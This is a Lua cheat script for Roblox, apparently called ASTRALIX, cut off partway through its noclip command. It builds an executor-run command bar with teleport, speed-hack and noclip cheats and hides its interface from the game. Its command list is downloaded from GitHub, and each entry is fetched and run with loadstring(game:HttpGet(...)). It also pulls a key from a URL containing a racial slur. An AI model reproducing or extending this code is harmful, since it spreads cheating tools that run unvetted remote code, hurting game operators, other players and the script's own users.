local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TextService = game:GetService("TextService")
local Player = Players.LocalPlayer
local env = getgenv()
if env.ASTRALIX_CLEANUP then env.ASTRALIX_CLEANUP() end
env.ASTRALIX_ACTIVE = env.ASTRALIX_ACTIVE or {}
env.ASTRALIX_MODULES = env.ASTRALIX_MODULES or {}
local noclipConnection = nil
local updateCheckConnection = nil
local currentScriptContent = nil
if env.ASTRALIX_ACTIVE then
    for componentName, componentData in pairs(env.ASTRALIX_ACTIVE) do
        if type(componentData) == "table" then
            for _, obj in pairs(componentData) do
                if typeof(obj) == "RBXScriptConnection" then
                    obj:Disconnect()
                elseif typeof(obj) == "Instance" then
                    obj:Destroy()
                end
            end
        end
    end
    env.ASTRALIX_ACTIVE = {}
end

local AstralixAPI = {}
AstralixAPI.__index = AstralixAPI

local function getCleanKeyName(keyCode)
    return tostring(keyCode):gsub("Enum.KeyCode.", "")
end

function AstralixAPI.new()
    local self = setmetatable({}, AstralixAPI)
    self.author = "nomvi, adrianek"
    return self
end

function AstralixAPI:init(core)
    self.core = core
    self.gui = core.gui
    self.SendNotify = core.SendNotify
    self.moduleExecute = core.moduleExecute
    self.autoComplete = core.autoComplete
end

function AstralixAPI:showNotification(title, text, duration, notifType)
    if self.SendNotify then
        return self.SendNotify:show(title, text, duration, notifType)
    end
    return false
end

function AstralixAPI:createElement(elementType, properties)
    local element = Instance.new(elementType)
    for prop, value in pairs(properties or {}) do
        pcall(function()
            element[prop] = value
        end)
    end
    return element
end

function AstralixAPI:addToActive(componentName, object)
    env.ASTRALIX_ACTIVE[componentName] = env.ASTRALIX_ACTIVE[componentName] or {}
    table.insert(env.ASTRALIX_ACTIVE[componentName], object)
end

function AstralixAPI:removeFromActive(componentName)
    if env.ASTRALIX_ACTIVE[componentName] then
        for _, obj in pairs(env.ASTRALIX_ACTIVE[componentName]) do
            if typeof(obj) == "RBXScriptConnection" then
                obj:Disconnect()
            elseif typeof(obj) == "Instance" then
                obj:Destroy()
            end
        end
        env.ASTRALIX_ACTIVE[componentName] = nil
    end
end

function AstralixAPI:getCommands()
    if self.moduleExecute and self.moduleExecute.commands then
        return self.moduleExecute.commands
    end
    return {}
end

env.API = AstralixAPI.new()
local astralix = {
    ["author"] = "nomvi",
    ["gui"] = nil,
    ["isOpen"] = false,
    ["isAnimating"] = false,
    ["squarePosition"] = nil,
    ["moduleExecute"] = nil,
    ["autoComplete"] = nil
}

local function getKEY()
    local success, response = pcall(function()
        return game:HttpGet("https://ichfickdeinemutta.pages.dev/niggakey.json")
    end)
    if success and response then
        local parseSuccess, data = pcall(function()
            return game:GetService("HttpService"):JSONDecode(response)
        end)
        if parseSuccess and data and data.key then
            return data.key
        end
    end
    return
end

local SYSTEM = {
    ["KEY"] = getKEY(),
    ["ICON_URL"] = "https://github.com/thenomvi/astralix/blob/main/astralix.png?raw=true",
    ["ICON_PATH"] = "ASTRALIX/icon.png",
    ["UPD_URL"] = "https://raw.githubusercontent.com/vkmenomv/xrvx/refs/heads/main/astralix.lua",
    ["CMDLIST_URL"] = "https://raw.githubusercontent.com/vkmenomv/xrvx/main/cmdlist.json",
    ["INTERVAL"] = 15,
    ["openKey"] = Enum.KeyCode.F5,
}

local function safeExecute(func, ...)
    return pcall(func, ...)
end

local function initializeCurrentVersion()
    local success, response = pcall(function()
        return game:HttpGet(SYSTEM.UPD_URL)
    end)
    if success and response then
        currentScriptContent = response
    end
end

local function checkForUpdates(sendNotify, isManualCheck)
    local success, response = pcall(function()
        return game:HttpGet(SYSTEM.UPD_URL)
    end)
    if not success then
        return
    end
    if not currentScriptContent then
        currentScriptContent = response
        return
    end
    if response and response ~= currentScriptContent then
        if sendNotify then
            sendNotify:show(
                "ASTRALIX UPDATE", 
                "New version of the script is available\nRe-execute the script to get update", 
                60, 
                "warning"
            )
        end
        currentScriptContent = response
    else
        if sendNotify and isManualCheck then
            sendNotify:show(
                "ASTRALIX", 
                "No updates available\nYou are using the latest version", 
                5, 
                "info"
            )
        end
    end
end

local function startUpdateChecker(sendNotify)
    if updateCheckConnection then
        updateCheckConnection:Disconnect()
    end
    initializeCurrentVersion()
    updateCheckConnection = task.spawn(function()
        while true do
            task.wait(SYSTEM.INTERVAL)
            checkForUpdates(sendNotify)
        end
    end)
end

local function createElement(elementType, properties)
    local element = Instance.new(elementType)
    for prop, value in pairs(properties or {}) do
        pcall(function()
            element[prop] = value
        end)
    end
    return element
end

local function addCorner(element, radius)
    createElement("UICorner", {CornerRadius = UDim.new(0, radius or 10), Parent = element})
end

local function addBorder(element, color, thickness, transparency)
    createElement(
        "UIStroke",
        {
            Color = color or Color3.fromRGB(100, 150, 255),
            Thickness = thickness or 2,
            Transparency = transparency or 0.3,
            Parent = element
        }
    )
end

local function addGradient(element, colors, rotation)
    createElement("UIGradient", {Color = ColorSequence.new(colors), Rotation = rotation or 90, Parent = element})
end

local function loadCommandList()
    local success, response = pcall(function()
        return game:HttpGet(SYSTEM.CMDLIST_URL)
    end)
    
    if success and response then
        local parseSuccess, commandList = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        
        if parseSuccess and commandList then
            return commandList
        end
    end
    
    return {}
end

local moduleExecute = {}
moduleExecute.__index = moduleExecute

function moduleExecute.new(SendNotify)
    return setmetatable({commands = {}, SendNotify = SendNotify}, moduleExecute)
end

function moduleExecute:register(name, func)
    self.commands[name:lower()] = {execute = func}
end

function moduleExecute:execute(input)
    if not input or type(input) ~= "string" then
        return false
    end
    local args = {}
    for word in input:gmatch("%S+") do
        table.insert(args, word)
    end
    if #args == 0 then
        return false
    end
    local cmdName = args[1]:lower()
    table.remove(args, 1)
    local command = self.commands[cmdName]
    if not command then
        if self.SendNotify then
            self.SendNotify:show(
                "ASTRALIX",
                "Unknown command: " .. cmdName .. "\nType help for available commands",
                5,
                "error"
            )
        end
        return false
    end
    local success, result = safeExecute(command.execute, args)
    if not success and self.SendNotify then
        self.SendNotify:show("ASTRALIX", "Command failed", 5, "error")
        return false
    end
    return true
end

function moduleExecute:findBestMatch(input)
    if input == "" then
        return nil
    end
    local inputLower = input:lower()
    local bestMatch = nil
    for commandName, _ in pairs(self.commands) do
        if commandName:sub(1, #inputLower) == inputLower and #commandName > #inputLower then
            if not bestMatch or #commandName < #bestMatch then
                bestMatch = commandName
            end
        end
    end
    return bestMatch
end

local autoComplete = {}
autoComplete.__index = autoComplete

function autoComplete.new(moduleExecute)
    return setmetatable({moduleExecute = moduleExecute, currentSuggestion = nil}, autoComplete)
end

function autoComplete:getSuggestion(text)
    local words = {}
    for word in text:gmatch("%S+") do
        table.insert(words, word)
    end
    if #words <= 1 and (text == "" or text:sub(-1) ~= " ") then
        return text == "" and nil or self.moduleExecute:findBestMatch(text)
    end
    return nil
end

function autoComplete:updateSuggestion(inputElement, suggestionElement, text)
    local suggestion = self:getSuggestion(text)
    if suggestion and suggestion ~= text then
        suggestionElement.Text = text .. suggestion:sub(#text + 1)
        suggestionElement.TextTransparency = 0.6
        self.currentSuggestion = suggestion
    else
        suggestionElement.Text = ""
        self.currentSuggestion = nil
    end
end

function autoComplete:applySuggestion(inputElement)
    if self.currentSuggestion then
        inputElement.Text = self.currentSuggestion .. " "
        self.currentSuggestion = nil
        return true
    end
    return false
end

local SendNotify = {}
SendNotify.__index = SendNotify

function SendNotify.new(container)
    return setmetatable({container = container, notifications = {}}, SendNotify)
end

function SendNotify:show(title, text, duration, notifType)
    local colors = {
        info = {bg = Color3.fromRGB(15, 20, 35), accent = Color3.fromRGB(100, 150, 255)},
        success = {bg = Color3.fromRGB(15, 25, 20), accent = Color3.fromRGB(100, 255, 150)},
        error = {bg = Color3.fromRGB(25, 15, 20), accent = Color3.fromRGB(255, 100, 120)},
        warning = {bg = Color3.fromRGB(25, 20, 15), accent = Color3.fromRGB(255, 200, 100)}
    }
    local color = colors[notifType or "info"] or colors.info
    duration = duration or 5

    local notification = createElement(
        "Frame",
        {
            Name = "Notification",
            Size = UDim2.new(1, 0, 0, 0),
            Position = UDim2.new(0, 0, 0, 0),
            BackgroundColor3 = color.bg,
            BackgroundTransparency = 0.1,
            BorderSizePixel = 0,
            Parent = self.container
        }
    )
    notification.LayoutOrder = 0
    for _, existingNotif in pairs(self.notifications) do
        if existingNotif and existingNotif.Parent then
            existingNotif.LayoutOrder = existingNotif.LayoutOrder + 1
        end
    end

    addCorner(notification, 12)
    addBorder(notification, color.accent, 1, 0.3)
    addGradient(
        notification,
        {
            ColorSequenceKeypoint.new(
                0,
                Color3.fromRGB(
                    math.min(color.bg.R * 255 + 15, 255),
                    math.min(color.bg.G * 255 + 15, 255),
                    math.min(color.bg.B * 255 + 15, 255)
                )
            ),
            ColorSequenceKeypoint.new(0.5, color.bg),
            ColorSequenceKeypoint.new(
                1,
                Color3.fromRGB(
                    math.max(color.bg.R * 255 - 10, 0),
                    math.max(color.bg.G * 255 - 10, 0),
                    math.max(color.bg.B * 255 - 10, 0)
                )
            )
        },
        135
    )

    createElement(
        "TextLabel",
        {
            Size = UDim2.new(1, -70, 0, 28),
            Position = UDim2.new(0, 18, 0, 8),
            BackgroundTransparency = 1,
            Text = title,
            Font = Enum.Font.GothamBold,
            TextSize = 16,
            TextColor3 = Color3.fromRGB(255, 255, 255),
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = notification
        }
    )

    local textBounds = TextService:GetTextSize(text, 14, Enum.Font.Gotham, Vector2.new(250, math.huge))
    local totalHeight = math.max(65, 44 + textBounds.Y + 12)

    createElement(
        "TextLabel",
        {
            Size = UDim2.new(1, -70, 0, textBounds.Y + 5),
            Position = UDim2.new(0, 18, 0, 34),
            BackgroundTransparency = 1,
            Text = text,
            Font = Enum.Font.Gotham,
            TextSize = 14,
            TextColor3 = Color3.fromRGB(200, 200, 220),
            TextXAlignment = Enum.TextXAlignment.Left,
            TextYAlignment = Enum.TextYAlignment.Top,
            TextWrapped = true,
            Parent = notification
        }
    )

    local closeButton = createElement(
        "TextButton",
        {
            Size = UDim2.new(0, 24, 0, 24),
            Position = UDim2.new(1, -30, 0, 8),
            BackgroundColor3 = Color3.fromRGB(40, 40, 60),
            BackgroundTransparency = 0.3,
            Text = "×",
            Font = Enum.Font.GothamBold,
            TextSize = 16,
            TextColor3 = Color3.fromRGB(255, 255, 255),
            BorderSizePixel = 0,
            Parent = notification
        }
    )
    addCorner(closeButton, 6)

    local progressContainer = createElement(
        "Frame",
        {
            Size = UDim2.new(1, -12, 0, 2),
            Position = UDim2.new(0, 6, 1, -8),
            BackgroundColor3 = Color3.fromRGB(0, 0, 0),
            BackgroundTransparency = 0.7,
            BorderSizePixel = 0,
            Parent = notification
        }
    )
    addCorner(progressContainer, 1)

    local progressBar = createElement(
        "Frame",
        {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundColor3 = color.accent,
            BorderSizePixel = 0,
            Parent = progressContainer
        }
    )
    addCorner(progressBar, 1)

    notification.Size = UDim2.new(1, 0, 0, totalHeight)
    notification.Position = UDim2.new(-1, 0, 0, 0)
    table.insert(self.notifications, 1, notification)

    local function closeNotification()
        TweenService:Create(
            notification,
            TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In),
            {
                Position = UDim2.new(-1, 0, 0, 0),
                BackgroundTransparency = 1
            }
        ):Play()
        local stroke = notification:FindFirstChild("UIStroke")
        if stroke then
            TweenService:Create(stroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
        end
        task.spawn(function()
            task.wait(0.3)
            notification:Destroy()
            for i, notif in pairs(self.notifications) do
                if notif == notification then
                    table.remove(self.notifications, i)
                    break
                end
            end
        end)
    end

    closeButton.MouseButton1Click:Connect(closeNotification)
    TweenService:Create(
        notification,
        TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {
            Position = UDim2.new(0, 0, 0, 0),
            BackgroundTransparency = 0.1
        }
    ):Play()
    TweenService:Create(progressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 1, 0)}):Play()
    task.spawn(function()
        task.wait(duration)
        if notification and notification.Parent then
            closeNotification()
        end
    end)
end

function astralix:createSquareButton()
    local squareButton = createElement(
        "TextButton",
        {
            Name = "SquareButton",
            Size = UDim2.new(0, 50, 0, 50),
            Position = UDim2.new(1, -230, -0.01, 20),
            BackgroundColor3 = Color3.fromRGB(8, 8, 8),
            BackgroundTransparency = 0.4,
            BorderSizePixel = 0,
            Text = "",
            AutoButtonColor = false,
            ZIndex = 10,
            Parent = self.gui
        }
    )
    addCorner(squareButton, 12)

    local squareIcon = createElement(
        "ImageLabel",
        {
            Size = UDim2.new(0.8, 0, 0.8, 0),
            Position = UDim2.new(0.1, 0, 0.1, 0),
            BackgroundTransparency = 1,
            ScaleType = Enum.ScaleType.Fit,
            Image = "",
            Parent = squareButton
        }
    )

    local fallbackText = createElement(
        "TextLabel",
        {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            Text = "A",
            Font = Enum.Font.GothamBold,
            TextSize = 20,
            TextColor3 = Color3.fromRGB(220, 220, 220),
            TextXAlignment = Enum.TextXAlignment.Center,
            TextYAlignment = Enum.TextYAlignment.Center,
            Parent = squareIcon
        }
    )

    task.spawn(function()
        local function tryLoadImage()
            if isfile and isfile(SYSTEM.ICON_PATH) then
                local imageSet = false
                if getcustomasset then
                    local success = pcall(function()
                        squareIcon.Image = getcustomasset(SYSTEM.ICON_PATH)
                        imageSet = true
                        fallbackText.Visible = false
                        squareIcon.ImageTransparency = 0
                    end)
                    if not success then
                        warn("[ASTRALIX] Failed to load asset")
                    end
                end
                if not imageSet and getsynasset then
                    local success = pcall(function()
                        squareIcon.Image = getsynasset(SYSTEM.ICON_PATH)
                        imageSet = true
                        fallbackText.Visible = false
                        squareIcon.ImageTransparency = 0
                    end)
                    if not success then
                        warn("[ASTRALIX] Failed to load asset")
                    end
                end
                return imageSet
            end
            return false
        end

        fallbackText.Visible = true
        squareIcon.ImageTransparency = 1
        local imageLoaded = tryLoadImage()
        if not imageLoaded then
            local success, imageData = pcall(function()
                return game:HttpGet(SYSTEM.ICON_URL)
            end)
            if success and imageData and type(imageData) == "string" and #imageData > 100 then
                local saveSuccess = pcall(function()
                    if not isfolder("ASTRALIX") then
                        makefolder("ASTRALIX")
                    end
                    writefile(SYSTEM.ICON_PATH, imageData)
                end)

                if saveSuccess then
                    task.wait(0.1)
                    imageLoaded = tryLoadImage()
                else
                    warn("[ASTRALIX] Failed to save icon")
                end
            else
                warn("[ASTRALIX] Failed to set icon")
            end
        end

        if imageLoaded then
            TweenService:Create(fallbackText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
            TweenService:Create(squareIcon, TweenInfo.new(0.3), {ImageTransparency = 0}):Play()
            task.wait(0.3)
            fallbackText.Visible = false
        else
            fallbackText.Visible = true
            fallbackText.Text = "A"
            print("ASTRALIX: Using fallback text")
        end
    end)

    local dragging, dragStart, startPos, isDragThresholdMet = false, nil, nil, false

    squareButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragStart, startPos, isDragThresholdMet, dragging = input.Position, squareButton.Position, false, true
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and dragStart and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            if math.sqrt(delta.X ^ 2 + delta.Y ^ 2) > 5 then
                isDragThresholdMet = true
            end
            if isDragThresholdMet then
                local newPos = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
                squareButton.Position = newPos
                self.squarePosition = newPos
            end
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging, isDragThresholdMet = false, false
        end
    end)
    return squareButton
end

function astralix:createWatermark()
    local watermarkFrame = createElement(
        "Frame",
        {
            Name = "WatermarkFrame",
            Size = UDim2.new(0, 170, 0, 50),
            Position = UDim2.new(1, -230, 0, 10),
            BackgroundColor3 = Color3.fromRGB(8, 12, 20),
            BackgroundTransparency = 0.4,
            BorderSizePixel = 0,
            ZIndex = 1000,
            Parent = self.gui
        }
    )
    addCorner(watermarkFrame, 10)
    addBorder(watermarkFrame, Color3.fromRGB(100, 150, 255), 1, 0.4)

    addGradient(
        watermarkFrame,
        {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 12, 20)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 25, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 12, 20))
        },
        500
    )

    local greenCircle = createElement(
        "Frame",
        {
            Size = UDim2.new(0, 8, 0, 8),
            Position = UDim2.new(0, 10, 0, 21),
            BackgroundColor3 = Color3.fromRGB(0, 255, 0),
            BorderSizePixel = 0,
            ZIndex = 1001,
            Parent = watermarkFrame
        }
    )
    addCorner(greenCircle, 4)

    local titleLabel = createElement(
        "TextLabel",
        {
            Size = UDim2.new(0, 80, 0, 15),
            Position = UDim2.new(0, 25, 0, 5),
            BackgroundTransparency = 1,
            Text = "ASTRALIX",
            Font = Enum.Font.GothamBold,
            TextSize = 15,
            TextColor3 = Color3.fromRGB(255, 255, 255),
            TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 1002,
            Parent = watermarkFrame
        }
    )

    addGradient(
        titleLabel,
        {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 250)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 250))
        },
        0
    )

    local fpsLabel = createElement(
        "TextLabel",
        {
            Size = UDim2.new(0, 80, 0, 12),
            Position = UDim2.new(0, 25, 0, 25),
            BackgroundTransparency = 1,
            Text = "FPS: 0",
            Font = Enum.Font.GothamMedium,
            TextSize = 11,
            TextColor3 = Color3.fromRGB(200, 200, 200),
            TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 1002,
            Parent = watermarkFrame
        }
    )

    TweenService:Create(
        watermarkFrame,
        TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {
            Position = UDim2.new(1, -175, 0, 10)
        }
    ):Play()

    task.spawn(function()
        local frameCount = 0
        local lastTime = tick()

        while watermarkFrame.Parent do
            RunService.Heartbeat:Wait()
            frameCount = frameCount + 1

            local currentTime = tick()
            if currentTime - lastTime >= 1 then
                local fps = math.floor(frameCount / (currentTime - lastTime))
                fpsLabel.Text = "FPS: " .. fps
                frameCount = 0
                lastTime = currentTime
            end
        end
    end)

    task.spawn(function()
        while watermarkFrame.Parent do
            local pulseTween1 = TweenService:Create(
                greenCircle,
                TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {BackgroundColor3 = Color3.fromRGB(0, 200, 0)}
            )
            local pulseTween2 = TweenService:Create(
                greenCircle,
                TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {BackgroundColor3 = Color3.fromRGB(0, 255, 0)}
            )
            pulseTween1:Play()
            pulseTween1.Completed:Wait()
            pulseTween2:Play()
            pulseTween2.Completed:Wait()
        end
    end)
end

function astralix:createCommandInterface()
    local commandFrame = createElement(
        "Frame",
        {
            Name = "CommandFrame",
            Size = UDim2.new(0, 50, 0, 50),
            BackgroundColor3 = Color3.fromRGB(12, 12, 15),
            BackgroundTransparency = 1,
            Visible = false,
            ZIndex = 15,
            Parent = self.gui
        }
    )
    addCorner(commandFrame, 18)

    addGradient(
        commandFrame,
        {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 20)),
            ColorSequenceKeypoint.new(0.3, Color3.fromRGB(25, 25, 35)),
            ColorSequenceKeypoint.new(0.7, Color3.fromRGB(30, 30, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 20))
        },
        90
    )

    local promptIcon = createElement(
        "TextLabel",
        {
            Size = UDim2.new(0, 30, 1, 0),
            Position = UDim2.new(0, 10, 0, 0),
            BackgroundTransparency = 1,
            Text = ">",
            Font = Enum.Font.GothamBold,
            TextSize = 20,
            TextColor3 = Color3.fromRGB(100, 120, 255),
            TextTransparency = 1,
            TextXAlignment = Enum.TextXAlignment.Center,
            ZIndex = 16,
            Parent = commandFrame
        }
    )

    local commandInput = createElement(
        "TextBox",
        {
            Size = UDim2.new(1, -55, 1, -20),
            Position = UDim2.new(0, 45, 0, 10),
            BackgroundTransparency = 1,
            Text = "",
            PlaceholderText = "Enter command...",
            Font = Enum.Font.GothamMedium,
            TextSize = 18,
            TextColor3 = Color3.fromRGB(240, 240, 245),
            TextTransparency = 1,
            PlaceholderColor3 = Color3.fromRGB(140, 140, 150),
            TextXAlignment = Enum.TextXAlignment.Left,
            ClearTextOnFocus = false,
            ZIndex = 16,
            Parent = commandFrame
        }
    )

    local commandSuggestion = createElement(
        "TextLabel",
        {
            Size = UDim2.new(1, -55, 1, -20),
            Position = UDim2.new(0, 45, 0, 10),
            BackgroundTransparency = 1,
            Text = "",
            Font = Enum.Font.GothamMedium,
            TextSize = 18,
            TextColor3 = Color3.fromRGB(140, 140, 150),
            TextTransparency = 1,
            TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 15,
            Parent = commandFrame
        }
    )

    commandInput.FocusLost:Connect(function(enterPressed)
        if enterPressed and commandInput.Text ~= "" then
            self.moduleExecute:execute(commandInput.Text)
            commandInput.Text = ""
            task.spawn(function()
                self:animateClose()
            end)
        elseif not enterPressed then
            task.spawn(function()
                self:animateClose()
            end)
        end
    end)

    commandInput:GetPropertyChangedSignal("Text"):Connect(function()
        if self.isOpen and commandInput:IsFocused() then
            self.autoComplete:updateSuggestion(commandInput, commandSuggestion, commandInput.Text)
        end
    end)

    return commandFrame, commandInput, commandSuggestion, promptIcon
end

function astralix:animateOpen()
    if self.isOpen or self.isAnimating then
        return
    end

    self.isOpen = true
    self.isAnimating = true

    local squareButton = self.gui:FindFirstChild("SquareButton")
    local commandFrame = self.gui:FindFirstChild("CommandFrame")
    if not squareButton or not commandFrame then
        self.isAnimating = false
        return
    end

    local commandInput = commandFrame:FindFirstChild("TextBox")
    local promptIcon = nil
    local commandSuggestion = nil

    for _, child in pairs(commandFrame:GetChildren()) do
        if child:IsA("TextLabel") then
            if child.Text == ">" then
                promptIcon = child
            elseif child.Text == "" or child.Text:find("Enter command") then
                commandSuggestion = child
            end
        end
    end

    self.squarePosition = squareButton.Position
    squareButton.Visible = false
    commandFrame.Visible = true
    commandFrame.Size = UDim2.new(0, 50, 0, 50)
    commandFrame.Position = self.squarePosition
    commandFrame.BackgroundTransparency = 1

    TweenService:Create(
        commandFrame,
        TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        {
            Position = UDim2.new(0.5, -25, 0.5, -25),
            BackgroundTransparency = 0.2
        }
    ):Play()

    task.wait(0.3)

    TweenService:Create(
        commandFrame,
        TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        {
            Size = UDim2.new(0, 500, 0, 50),
            Position = UDim2.new(0.5, -250, 0.5, -25)
        }
    ):Play()

    task.wait(0.2)

    if promptIcon then
        TweenService:Create(promptIcon, TweenInfo.new(0.15), {TextTransparency = 0}):Play()
    end
    if commandInput then
        TweenService:Create(commandInput, TweenInfo.new(0.15), {TextTransparency = 0}):Play()
    end
    if commandSuggestion then
        TweenService:Create(commandSuggestion, TweenInfo.new(0.15), {TextTransparency = 0.6}):Play()
    end

    if commandInput then
        commandInput:CaptureFocus()
    end
    self.isAnimating = false
end

function astralix:animateClose()
    if not self.isOpen or self.isAnimating or not self.gui then
        return
    end
    self.isOpen = false
    self.isAnimating = true
    local squareButton = self.gui:FindFirstChild("SquareButton")
    local commandFrame = self.gui:FindFirstChild("CommandFrame")
    if not commandFrame or not squareButton then
        self.isAnimating = false
        return
    end

    local commandInput = commandFrame:FindFirstChild("TextBox")
    local promptIcon = nil
    local commandSuggestion = nil

    for _, child in pairs(commandFrame:GetChildren()) do
        if child:IsA("TextLabel") then
            if child.Text == ">" then
                promptIcon = child
            elseif child.Text == "" or child.Text:find("Enter command") then
                commandSuggestion = child
            end
        end
    end

    if promptIcon then
        TweenService:Create(promptIcon, TweenInfo.new(0.1), {TextTransparency = 1}):Play()
    end
    if commandInput then
        TweenService:Create(commandInput, TweenInfo.new(0.1), {TextTransparency = 1}):Play()
    end
    if commandSuggestion then
        TweenService:Create(commandSuggestion, TweenInfo.new(0.1), {TextTransparency = 1}):Play()
    end

    task.wait(0.1)

    TweenService:Create(
        commandFrame,
        TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
        {
            Size = UDim2.new(0, 500, 0, 50),
            Position = UDim2.new(0.5, -250, 0.5, -25)
        }
    ):Play()

    task.wait(0.2)

    TweenService:Create(
        commandFrame,
        TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
        {
            Size = UDim2.new(0, 50, 0, 50),
            Position = UDim2.new(0.5, -25, 0.5, -25)
        }
    ):Play()

    task.wait(0.3)

    if self.squarePosition then
        TweenService:Create(
            commandFrame,
            TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
            {
                Position = self.squarePosition,
                BackgroundTransparency = 1
            }
        ):Play()

        task.wait(0.25)

        commandFrame.Visible = false
        squareButton.Visible = true
        squareButton.Size = UDim2.new(0, 50, 0, 50)
        squareButton.Position = self.squarePosition
        squareButton.BackgroundTransparency = 0.4
    else
        commandFrame.Visible = false
        squareButton.Visible = true
    end

    self.isAnimating = false
end

function astralix:gui()
    local screenGui = createElement(
        "ScreenGui",
        {
            Name = "ASTRALIX",
            ResetOnSpawn = false,
            ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
            Parent = (syn and syn.protect_gui and game:GetService("CoreGui")) or (gethui and gethui()) or Player.PlayerGui
        }
    )

    if syn and syn.protect_gui then
        syn.protect_gui(screenGui)
    end

    self.gui = screenGui

    local NotifyContainer = createElement(
        "Frame",
        {
            Name = "NotifyContainer",
            Size = UDim2.new(0, 400, 0, 500),
            Position = UDim2.new(1, -410, 0, 80),
            BackgroundTransparency = 1,
            ZIndex = 20,
            Parent = screenGui
        }
    )

    createElement(
        "UIListLayout",
        {
            SortOrder = Enum.SortOrder.LayoutOrder,
            Padding = UDim.new(0, 10),
            VerticalAlignment = Enum.VerticalAlignment.Top,
            Parent = NotifyContainer
        }
    )

    self.SendNotify = SendNotify.new(NotifyContainer)
    self.moduleExecute = moduleExecute.new(self.SendNotify)
    self.autoComplete = autoComplete.new(self.moduleExecute)
    env.API:init(self)
    self.moduleExecute:register(
    "keybind",
    function(args)
        if not args[1] then
            self.SendNotify:show(
                "ASTRALIX", 
                "Current keybind: "..getCleanKeyName(SYSTEM.openKey).."\nUsage: keybind <key>", 
                5, 
                "info"
            )
            return
        end
        local newKey = Enum.KeyCode[args[1]:upper()]
        if not newKey then
            self.SendNotify:show("ASTRALIX", "Invalid key: "..args[1], 5, "error")
            return
        end
        SYSTEM.openKey = newKey
            self.SendNotify:show(
                "ASTRALIX", 
                "Keybind set to: "..getCleanKeyName(newKey), 
                5, 
                "success"
            )
        end
    )

    task.spawn(function()
        local commandList = loadCommandList()
        for commandName, commandUrl in pairs(commandList) do
            self.moduleExecute:register(
                commandName,
                function(args)
                    if commandName == "twistie" then
                        coroutine.wrap(function()
                            loadstring(game:HttpGet(commandUrl))()
                        end)()
                    elseif commandName == "cb" then
                        if game.PlaceId ~= 301549746 and game.PlaceId ~= 286090429 then
                            self.SendNotify:show("ASTRALIX", "Works only in Counter Blox & Arsenal", 5, "error")
                            return
                        end
                        loadstring(game:HttpGet(commandUrl))()
                    else
                        loadstring(game:HttpGet(commandUrl))()
                    end
                end
            )
        end
    end)

    self.moduleExecute:register(
        "info",
        function(args)
            self.SendNotify:show("ASTRALIX", "Author: " .. astralix.author .. "\nDiscord: .gg/QdtYzhHhJ8", 5, "info")
        end
    )

    self.moduleExecute:register(
        "tp",
        function(args)
            if not args[1] then
                self.SendNotify:show("ASTRALIX", "Usage: tp <player>", 3, "error")
                return
            end
            local targetName = args[1]:lower()
            local targetPlayer = nil
            for _, player in pairs(Players:GetPlayers()) do
                if player.DisplayName:lower():find(targetName) or player.Name:lower():find(targetName) then
                    targetPlayer = player
                    break
                end
            end
            if not targetPlayer then
                self.SendNotify:show("ASTRALIX", "Player not found", 3, "error")
                return
            end
            if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                self.SendNotify:show("ASTRALIX", "Target player has no character", 3, "error")
                return
            end
            Player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            self.SendNotify:show("ASTRALIX", "Teleported to " .. targetPlayer.DisplayName, 3, "success")
        end
    )

    self.moduleExecute:register(
        "speed",
        function(args)
            if not args[1] then
                self.SendNotify:show("ASTRALIX", "Usage: speed <int>", 3, "error")
                return
            end
            local speed = tonumber(args[1]) or 16
            if speedConnection then
                speedConnection:Disconnect()
            end
            speedConnection = RunService.Heartbeat:Connect(function()
                if Player.Character then
                    local humanoid = Player.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        humanoid.WalkSpeed = speed
                    end
                end
            end)
            self.SendNotify:show("ASTRALIX", "Speed set to " .. speed, 3, "success")
        end
    )

    self.moduleExecute:register(
        "noclip",
        function(args)
            if not Player.Character then
                return
            end
            if noclipConnection then
                noclipConnection:Disconnect()
